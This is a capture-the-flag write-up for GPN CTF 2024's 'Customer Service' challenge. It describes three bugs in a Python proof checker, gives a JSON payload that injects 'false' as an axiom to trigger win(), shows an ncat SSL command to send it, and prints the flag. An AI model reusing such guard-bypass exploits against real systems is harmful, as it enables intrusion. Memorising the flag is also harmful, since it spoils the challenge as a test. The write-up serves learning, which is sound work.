# Customer Service

| Field | Details |
|-------|---------|
| **Challenge** | Customer Service |
| **CTF** | GPN CTF 2024 |
| **Category** | Misc / Pwn |
| **Difficulty** | Medium |
| **Flag** | `GPNCTF{Ex-Un4-11nE4-VAcUA-SequitUr-qUoD1iB37}` |

---

## Overview

The server accepts a hex-encoded JSON proof object over SSL and validates it through a Python proof checker. The goal is to make the checker call `win()` by proving `false`.

---

## Bugs Found

**Bug 1: Axiom guard type mismatch:** `elif report.get_axioms() == 1` compares a list to the integer `1`: always `False`, so the guard is never triggered.

**Bug 2: Silent axiom injection:** A `thm.ax` item hits the `else` branch, adds an axiom silently, and never calls `win()`.

**Bug 3: Untyped `false` variable:** `false` without a type annotation parses as an untyped variable: declare it in `vars` to make it usable.

---

## Exploit Logic

1. Send a `thm.ax` item: axiom guard is skipped (Bug 1 + Bug 2), adds `false` as an axiom
2. Send a `thm` item: proof references that axiom → checker accepts → `win()` fires

### Payload

```json
{
  "imports": [],
  "content": [
    {
      "ty": "thm.ax",
      "name": "fa",
      "vars": {"false": "bool"},
      "prop": "false"
    },
    {
      "ty": "thm",
      "name": "pf",
      "vars": {"false": "bool"},
      "prop": "false",
      "proof": [{"id": "0", "rule": "theorem", "args": "fa", "prevs": [], "th": ""}]
    }
  ]
}
```

Hex-encode the above and send over:

```bash
ncat --ssl <host> 443
```

---

## Flag

```
GPNCTF{Ex-Un4-11nE4-VAcUA-SequitUr-qUoD1iB37}
```
